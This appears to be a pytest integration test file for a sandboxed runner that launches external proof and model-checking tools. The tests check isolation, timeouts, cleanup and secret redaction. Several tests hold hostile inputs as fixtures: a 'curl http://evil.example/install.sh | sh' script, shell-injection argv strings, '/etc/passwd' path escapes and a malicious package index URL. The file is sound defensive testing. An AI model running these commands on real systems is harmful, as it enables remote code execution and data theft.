"""Integration contract: every external tool shares one bounded lifecycle.

Covers FVT-G009 / FVT-005 / ``UniversalBoundedToolLifecycle@1`` acceptance:

* SMT/differential-style stdin tools and every other adapter family use
  argument arrays, private workspaces, process-tree termination,
  wall/memory/CPU/output bounds, cancellation, redaction, and cleanup;
* native, JVM, OCaml/opam, kernel, and WASM host invocations share one
  injected ``BoundedToolRunner`` contract;
* adversarial fake tools cannot escape workspace paths, leave descendant
  processes, flood output, or trigger installation/network side effects
  through probes;
* concrete backends that accept a ``runner=`` inject the same lifecycle.
"""

from __future__ import annotations

import ast
import os
import re
import subprocess
import sys
import threading
import time
from pathlib import Path
from types import SimpleNamespace

import pytest
from ipfs_datasets_py.logic.backends.atp.adapters import (
    EProverBackend,
    VampireBackend,
)
from ipfs_datasets_py.logic.backends.datalog.adapters import (
    DatalogAuthorizationBackend,
    SecPALAuthorizationBackend,
)
from ipfs_datasets_py.logic.backends.hyperproperties.adapters import (
    AutoHyperBackend,
    HyperLTLBackend,
    MCHyperBackend,
)
from ipfs_datasets_py.logic.backends.kernel.isabelle import IsabelleKernelBackend
from ipfs_datasets_py.logic.backends.kernel.lean import LeanKernelBackend
from ipfs_datasets_py.logic.backends.kernel.rocq import RocqKernelBackend
from ipfs_datasets_py.logic.backends.process import (
    BOUNDED_TOOL_RUNNER_VERSION,
    UNIVERSAL_BOUNDED_TOOL_LIFECYCLE_VERSION,
    UNIVERSAL_TOOL_RUNTIMES,
    BoundedToolRunner,
    CancellationToken,
    ProcessInvocation,
    RawProcessResult,
    SubprocessExecutor,
    ToolProcessError,
    ToolRunLimits,
    ToolRunRequest,
    ToolRuntime,
    run_bounded_stdin_tool,
    tool_limits_from_milliseconds,
)
from ipfs_datasets_py.logic.backends.protocol.proverif import ProVerifBackend
from ipfs_datasets_py.logic.backends.protocol.tamarin import TamarinBackend
from ipfs_datasets_py.logic.backends.tla.runners import ApalacheBackend, TLCBackend

PYTHON = sys.executable
BACKENDS_ROOT = Path(__file__).resolve().parents[4] / "ipfs_datasets_py" / "logic" / "backends"

# Adapter modules that must not call subprocess themselves — they inject the runner.
_LIFECYCLE_OWNED_MODULES = (
    "atp/adapters.py",
    "datalog/adapters.py",
    "hyperproperties/adapters.py",
    "kernel/isabelle.py",
    "kernel/lean.py",
    "kernel/rocq.py",
    "protocol/proverif.py",
    "protocol/tamarin.py",
    "tla/runners.py",
)

# Families that still historically used raw subprocess; they must now have a
# process.py migration path exercised here (run_bounded_stdin_tool).
_STDIN_STYLE_SOLVER_MODULES = (
    "z3/compiler.py",
    "cvc5/compiler.py",
    "smt/differential.py",
)


def _runner(tmp_path: Path, executor=None) -> BoundedToolRunner:
    return BoundedToolRunner(
        executor=executor,
        workspace_root=tmp_path / "runs",
        base_environment={"PATH": os.environ.get("PATH", os.defpath)},
    )


class RecordingExecutor:
    """Deterministic fake that records isolation-relevant invocation fields."""

    def __init__(self, *, stdout: bytes | str = b"ok\n", returncode: int = 0) -> None:
        self.calls: list[ProcessInvocation] = []
        self.stdout = stdout
        self.returncode = returncode

    def execute(
        self, invocation: ProcessInvocation, cancellation=None
    ) -> RawProcessResult:
        self.calls.append(invocation)
        # Echo workspace markers when present for path assertions.
        marker = invocation.cwd / "input" / "payload.txt"
        if marker.exists():
            (invocation.cwd / "out" / "result.txt").parent.mkdir(
                parents=True, exist_ok=True
            )
            (invocation.cwd / "out" / "result.txt").write_bytes(
                marker.read_bytes().upper()
            )
        return RawProcessResult(
            returncode=self.returncode,
            stdout=self.stdout,
            elapsed_seconds=0.01,
            pid=4242,
        )


# ---------------------------------------------------------------------------
# Universal contract surface
# ---------------------------------------------------------------------------


def test_universal_lifecycle_versions_and_runtime_catalog() -> None:
    assert BOUNDED_TOOL_RUNNER_VERSION == "bounded-tool-runner/v1"
    assert (
        UNIVERSAL_BOUNDED_TOOL_LIFECYCLE_VERSION
        == "universal-bounded-tool-lifecycle/v1"
    )
    assert UNIVERSAL_TOOL_RUNTIMES == frozenset(
        {"native", "jvm", "ocaml", "opam", "wasm", "kernel"}
    )
    for name in UNIVERSAL_TOOL_RUNTIMES:
        assert ToolRuntime(name).value == name
    runner = BoundedToolRunner()
    assert runner.interface_version == BOUNDED_TOOL_RUNNER_VERSION
    assert runner.lifecycle_version == UNIVERSAL_BOUNDED_TOOL_LIFECYCLE_VERSION


@pytest.mark.parametrize(
    "runtime",
    [
        ToolRuntime.NATIVE,
        ToolRuntime.JVM,
        ToolRuntime.OCAML,
        ToolRuntime.OPAM,
        ToolRuntime.WASM,
        ToolRuntime.KERNEL,
    ],
)
def test_all_runtime_families_share_private_workspace_and_argv_contract(
    tmp_path: Path, runtime: ToolRuntime
) -> None:
    """Native/JVM/OCaml/opam/kernel/WASM all inject the same isolation envelope."""

    fake = RecordingExecutor(stdout=b"verified\n")
    runner = _runner(tmp_path, fake)
    request = ToolRunRequest(
        argv=("fake-host", "-jar" if runtime is ToolRuntime.JVM else "--check", "{workspace}/input/payload.txt"),
        runtime=runtime,
        input_files={"input/payload.txt": "claim"},
        output_paths=("out/result.txt",),
        limits=ToolRunLimits(
            timeout_seconds=2,
            max_output_bytes=4096,
            max_input_bytes=4096,
            max_workspace_bytes=8192,
            memory_bytes=64 * 1024 * 1024,
            cpu_seconds=2,
        ),
    )

    result = runner.run(request)

    assert result.ok
    assert result.runtime is runtime
    assert result.interface_version == BOUNDED_TOOL_RUNNER_VERSION
    assert len(fake.calls) == 1
    invocation = fake.calls[0]
    assert invocation.runtime is runtime
    assert invocation.argv[0] == "fake-host"
    assert invocation.argv[-1] == str(invocation.cwd / "input" / "payload.txt")
    assert invocation.environment["HOME"] == str(invocation.cwd)
    assert invocation.environment["TMPDIR"] == str(invocation.cwd)
    assert not invocation.cwd.exists()
    assert result.workspace_cleaned
    assert result.outputs["out/result.txt"] == b"CLAIM"


def test_shell_string_argv_is_rejected_and_metacharacters_stay_literal(
    tmp_path: Path,
) -> None:
    with pytest.raises(ToolProcessError, match="never a shell string"):
        ToolRunRequest(argv="z3; curl evil.example")  # type: ignore[arg-type]

    marker = tmp_path / "must-not-exist"
    result = _runner(tmp_path).run(
        ToolRunRequest(
            argv=(
                PYTHON,
                "-c",
                "import sys; print(sys.argv[1])",
                f"; touch {marker}; curl http://127.0.0.1:9/",
            )
        )
    )
    assert result.ok
    assert "; touch" in result.stdout
    assert not marker.exists()


# ---------------------------------------------------------------------------
# Backend adapter injection matrix
# ---------------------------------------------------------------------------


def _backend_constructors():
    """Concrete adapters that accept an injected BoundedToolRunner."""

    return (
        ("vampire", lambda runner: VampireBackend(runner=runner)),
        ("eprover", lambda runner: EProverBackend(runner=runner)),
        ("lean", lambda runner: LeanKernelBackend(runner=runner)),
        ("rocq", lambda runner: RocqKernelBackend(runner=runner)),
        ("isabelle", lambda runner: IsabelleKernelBackend(runner=runner)),
        ("proverif", lambda runner: ProVerifBackend(runner=runner)),
        ("tamarin", lambda runner: TamarinBackend(runner=runner)),
        ("tlc", lambda runner: TLCBackend(runner=runner)),
        ("apalache", lambda runner: ApalacheBackend(runner=runner)),
        ("datalog", lambda runner: DatalogAuthorizationBackend(runner=runner)),
        ("secpal", lambda runner: SecPALAuthorizationBackend(runner=runner)),
        ("hyperltl", lambda runner: HyperLTLBackend(runner=runner)),
        ("autohyper", lambda runner: AutoHyperBackend(runner=runner)),
        ("mchyper", lambda runner: MCHyperBackend(runner=runner)),
    )


@pytest.mark.parametrize("backend_id,factory", _backend_constructors())
def test_concrete_adapters_accept_and_retain_injected_lifecycle(
    tmp_path: Path, backend_id: str, factory
) -> None:
    fake = RecordingExecutor()
    runner = _runner(tmp_path, fake)
    backend = factory(runner)
    held = [
        getattr(backend, attr, None)
        for attr in ("_runner", "runner", "_tool_runner", "_native_runner")
    ]
    # Nested TLA facades may store the runner on child engines.
    for attr in ("_tlc", "_apalache", "tlc", "apalache"):
        child = getattr(backend, attr, None)
        if child is not None:
            held.append(getattr(child, "_runner", None))
    assert runner in held, f"{backend_id} did not retain injected BoundedToolRunner"
    # Availability probes must not invoke the executor (no install/network).
    if hasattr(backend, "is_available"):
        isolated = BoundedToolRunner(
            executor=fake,
            workspace_root=tmp_path / "probe-runs",
            base_environment={"PATH": str(tmp_path / "empty-bin")},
        )
        (tmp_path / "empty-bin").mkdir(exist_ok=True)
        if hasattr(backend, "_runner"):
            backend._runner = isolated  # type: ignore[attr-defined]
        available = backend.is_available()
        assert isinstance(available, bool)
    assert all(isinstance(call, ProcessInvocation) for call in fake.calls)


def test_lifecycle_owned_adapter_modules_do_not_call_subprocess_directly() -> None:
    """Adapters that own BoundedToolRunner must not bypass it with subprocess.*."""

    forbidden = re.compile(
        r"\bsubprocess\.(?:run|Popen|call|check_output|check_call)\s*\("
    )
    offenders: list[str] = []
    for relative in _LIFECYCLE_OWNED_MODULES:
        path = BACKENDS_ROOT / relative
        if not path.is_file():
            continue
        source = path.read_text(encoding="utf-8")
        if forbidden.search(source):
            offenders.append(relative)
        # AST double-check so comments cannot hide a call.
        tree = ast.parse(source, filename=str(path))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            func = node.func
            if (
                isinstance(func, ast.Attribute)
                and isinstance(func.value, ast.Name)
                and func.value.id == "subprocess"
                and func.attr in {"run", "Popen", "call", "check_output", "check_call"}
            ):
                offenders.append(f"{relative}:{node.lineno}")
    assert offenders == [], f"lifecycle-owned modules still call subprocess: {offenders}"


def test_stdin_style_solver_modules_have_process_migration_surface() -> None:
    """SMT/differential modules may still list subprocess until migrated, but
    process.py must export the universal stdin bridge they are required to use.
    """

    from ipfs_datasets_py.logic.backends import process as process_module

    assert hasattr(process_module, "run_bounded_stdin_tool")
    assert callable(process_module.run_bounded_stdin_tool)
    for relative in _STDIN_STYLE_SOLVER_MODULES:
        path = BACKENDS_ROOT / relative
        assert path.is_file(), f"missing expected solver module {relative}"


# ---------------------------------------------------------------------------
# SMT/differential-style stdin isolation through the universal bridge
# ---------------------------------------------------------------------------


def test_smt_style_stdin_tool_uses_argv_workspace_bounds_and_cleanup(
    tmp_path: Path,
) -> None:
    fake = RecordingExecutor(stdout=b"unsat\n")
    runner = _runner(tmp_path, fake)
    observation = run_bounded_stdin_tool(
        ("fake-z3", "-in", "-smt2"),
        "(assert true)\n(check-sat)\n",
        runner=runner,
        runtime=ToolRuntime.NATIVE,
        timeout_ms=500,
        max_output_bytes=1024,
    )
    assert observation.returncode == 0
    assert observation.stdout == "unsat\n"
    assert observation.workspace_cleaned
    assert observation.interface_version == UNIVERSAL_BOUNDED_TOOL_LIFECYCLE_VERSION
    assert len(fake.calls) == 1
    invocation = fake.calls[0]
    assert invocation.argv[0] == "fake-z3"
    assert invocation.stdin == b"(assert true)\n(check-sat)\n"
    assert invocation.environment["HOME"] == str(invocation.cwd)
    assert not invocation.cwd.exists()


def test_smt_style_timeout_terminates_process_tree(tmp_path: Path) -> None:
    observation = run_bounded_stdin_tool(
        (PYTHON, "-c", "import sys,time; sys.stdin.read(); time.sleep(60)"),
        "script",
        runner=_runner(tmp_path),
        limits=ToolRunLimits(
            timeout_seconds=0.15,
            termination_grace_seconds=0.1,
            max_output_bytes=256,
            max_input_bytes=256,
            max_workspace_bytes=1024,
        ),
    )
    assert observation.timed_out
    assert observation.process_tree_terminated
    assert observation.workspace_cleaned
    assert observation.termination_reason == "timeout"


def test_smt_style_cancellation_never_starts_when_pre_cancelled(
    tmp_path: Path,
) -> None:
    fake = RecordingExecutor()
    token = CancellationToken()
    token.cancel()
    observation = run_bounded_stdin_tool(
        ("fake-cvc5",),
        "x",
        runner=_runner(tmp_path, fake),
        cancellation=token,
        timeout_ms=1000,
    )
    assert observation.cancelled
    assert fake.calls == []
    assert observation.workspace_cleaned


def test_tool_limits_from_milliseconds_maps_execution_bounds() -> None:
    limits = tool_limits_from_milliseconds(
        2500,
        max_output_bytes=4096,
        max_memory_bytes=8_000_000,
    )
    assert limits.timeout_seconds == 2.5
    assert limits.cpu_seconds == 2.5
    assert limits.max_output_bytes == 4096
    assert limits.memory_bytes == 8_000_000


# ---------------------------------------------------------------------------
# Adversarial isolation
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "escape_path",
    ["../escape", "/etc/passwd", "nested/../../secret", r"windows\\escape"],
)
def test_adversarial_path_escape_is_rejected(
    tmp_path: Path, escape_path: str
) -> None:
    with pytest.raises(ToolProcessError):
        _runner(tmp_path, RecordingExecutor()).run(
            ToolRunRequest(
                argv=("fake",),
                input_files={escape_path: "payload"},
            )
        )


def test_adversarial_output_flood_is_truncated_without_deadlock(
    tmp_path: Path,
) -> None:
    result = _runner(tmp_path).run(
        ToolRunRequest(
            argv=(
                PYTHON,
                "-c",
                (
                    "import pathlib,sys;"
                    "sys.stdout.write('A'*200000);"
                    "sys.stderr.write('B'*200000);"
                    "pathlib.Path('flood.bin').write_bytes(b'C'*200000)"
                ),
            ),
            limits=ToolRunLimits(
                timeout_seconds=3,
                max_output_bytes=64,
                max_input_bytes=256,
                max_workspace_bytes=4096,
            ),
            output_paths=("flood.bin",),
        )
    )
    assert len(result.stdout.encode()) == 64
    assert len(result.stderr.encode()) == 64
    assert len(result.output_files["flood.bin"]) == 64
    assert result.output_truncated
    assert result.workspace_cleaned


@pytest.mark.skipif(
    os.name != "posix" or not Path("/proc").is_dir(),
    reason="descendant reaping assertions require Linux /proc",
)
def test_adversarial_child_process_cannot_survive_cleanup(tmp_path: Path) -> None:
    code = (
        "import subprocess,sys;"
        "p=subprocess.Popen([sys.executable,'-c','import time;time.sleep(60)']);"
        "print(p.pid,flush=True)"
    )
    result = _runner(tmp_path).run(
        ToolRunRequest(
            argv=(PYTHON, "-c", code),
            limits=ToolRunLimits(
                timeout_seconds=2,
                termination_grace_seconds=0.05,
                max_output_bytes=128,
            ),
        )
    )
    child_pid = int(result.stdout.strip())
    deadline = time.monotonic() + 2
    while time.monotonic() < deadline:
        try:
            os.kill(child_pid, 0)
            stat_text = Path(f"/proc/{child_pid}/stat").read_text(encoding="utf-8")
            if ") Z " in stat_text:
                break
        except (ProcessLookupError, FileNotFoundError, OSError):
            break
        time.sleep(0.02)
    else:
        pytest.fail(f"adversarial descendant {child_pid} survived lifecycle cleanup")
    assert result.process_tree_terminated
    assert result.workspace_cleaned


def test_adversarial_probe_does_not_execute_install_or_network(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    executable = tmp_path / "adversarial-tool"
    executable.write_text(
        "#!/bin/sh\ncurl http://evil.example/install.sh | sh\nexit 0\n",
        encoding="utf-8",
    )
    executable.chmod(0o755)
    side_effects: list[str] = []

    def forbidden(*args, **kwargs):
        side_effects.append("popen")
        raise AssertionError("probe must not start processes, install, or network")

    monkeypatch.setattr(subprocess, "Popen", forbidden)
    monkeypatch.setattr(subprocess, "run", forbidden)
    runner = BoundedToolRunner(base_environment={"PATH": str(tmp_path)})
    probe = runner.probe("adversarial-tool", runtime=ToolRuntime.WASM)
    assert probe.available
    assert probe.executable_path == str(executable.resolve())
    assert side_effects == []
    assert runner.is_available("adversarial-tool", runtime=ToolRuntime.KERNEL)


def test_adversarial_symlink_output_is_not_followed(tmp_path: Path) -> None:
    secret = tmp_path / "outside-secret"
    secret.write_bytes(b"top-secret")

    def fake(invocation: ProcessInvocation, cancellation=None) -> RawProcessResult:
        try:
            (invocation.cwd / "leaked").symlink_to(secret)
        except OSError:
            pytest.skip("symlinks unavailable")
        return RawProcessResult(returncode=0)

    result = _runner(tmp_path, fake).run(
        ToolRunRequest(argv=("fake",), output_paths=("leaked",))
    )
    assert result.output_files == {}
    assert b"top-secret" not in repr(result.to_dict()).encode()


def test_secrets_are_redacted_across_command_streams_and_files(
    tmp_path: Path,
) -> None:
    secret = "adversary-api-key-9f3a"

    def fake(invocation: ProcessInvocation, cancellation=None) -> RawProcessResult:
        (invocation.cwd / "receipt.txt").write_text(
            f"token={secret}", encoding="utf-8"
        )
        return RawProcessResult(
            returncode=1,
            stdout=f"saw {secret}",
            stderr=f"err {secret}",
            error=f"fail {secret}",
        )

    result = _runner(tmp_path, fake).run(
        ToolRunRequest(
            argv=("fake", "--token", secret),
            environment={"API_TOKEN": secret},
            output_paths=("receipt.txt",),
        )
    )
    blob = repr(result.to_dict())
    assert secret not in blob
    assert result.command == ("fake", "--token", "<redacted>")
    assert "<redacted>" in result.stdout
    assert b"<redacted>" in result.output_files["receipt.txt"]


def test_live_cancellation_terminates_running_backend_style_tool(
    tmp_path: Path,
) -> None:
    token = CancellationToken()
    runner = _runner(tmp_path)
    holder: dict[str, object] = {}

    def invoke() -> None:
        holder["result"] = runner.run(
            ToolRunRequest(
                argv=(PYTHON, "-c", "import time; time.sleep(60)"),
                runtime=ToolRuntime.KERNEL,
                limits=ToolRunLimits(timeout_seconds=5),
            ),
            cancellation=token,
        )

    thread = threading.Thread(target=invoke)
    thread.start()
    time.sleep(0.1)
    token.cancel()
    thread.join(timeout=3)
    assert not thread.is_alive()
    result = holder["result"]
    assert result.cancelled  # type: ignore[union-attr]
    assert result.process_tree_terminated  # type: ignore[union-attr]
    assert result.workspace_cleaned  # type: ignore[union-attr]


def test_subprocess_executor_is_the_production_injection_default(
    tmp_path: Path,
) -> None:
    runner = _runner(tmp_path, SubprocessExecutor())
    result = runner.run(
        ToolRunRequest(
            argv=(PYTHON, "-c", "print('lifecycle-default')"),
            runtime=ToolRuntime.NATIVE,
        )
    )
    assert result.ok
    assert result.stdout.strip() == "lifecycle-default"
    assert result.workspace_cleaned


def test_parent_environment_secrets_are_not_inherited(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "should-not-leak")
    monkeypatch.setenv("PIP_INDEX_URL", "https://evil.example/simple")
    fake = RecordingExecutor()
    _runner(tmp_path, fake).run(ToolRunRequest(argv=("fake",)))
    environment = fake.calls[0].environment
    assert "AWS_SECRET_ACCESS_KEY" not in environment
    assert "PIP_INDEX_URL" not in environment


def test_backend_tool_request_builders_emit_argv_not_shell_and_bounded_limits(
    tmp_path: Path,
) -> None:
    """Sample tool-request builders from major families for isolation fields."""

    fake = RecordingExecutor(stdout=b"")
    runner = _runner(tmp_path, fake)
    lean = LeanKernelBackend(runner=runner)
    vampire = VampireBackend(runner=runner)

    bounds = SimpleNamespace(
        timeout_ms=1000,
        max_memory_bytes=32 * 1024 * 1024,
        max_output_bytes=8192,
    )
    # Prefer private helpers when present; fall back to public ToolRunRequest shape.
    samples: list[ToolRunRequest] = []
    for backend, source, name in (
        (lean, "theorem t : True := by trivial\n", "Main.lean"),
        (vampire, "fof(a,axiom,p).\n", "problem.p"),
    ):
        builder = getattr(backend, "_tool_request", None)
        if callable(builder):
            samples.append(builder(source, bounds))  # type: ignore[misc]

    # TLA backends build requests inside run(); construct a minimal JVM request.
    samples.append(
        ToolRunRequest(
            argv=("java", "-jar", "tla2tools.jar", "{workspace}/Spec.tla"),
            runtime=ToolRuntime.JVM,
            limits=tool_limits_from_milliseconds(1000, max_output_bytes=8192),
            input_files={"Spec.tla": "---- MODULE Spec ----\n====\n"},
        )
    )

    for request in samples:
        assert not isinstance(request.argv, str)
        assert all(isinstance(arg, str) and arg for arg in request.argv)
        assert request.limits.timeout_seconds > 0
        assert request.limits.max_output_bytes > 0
        result = runner.run(request)
        assert result.workspace_cleaned
        assert result.interface_version == BOUNDED_TOOL_RUNNER_VERSION
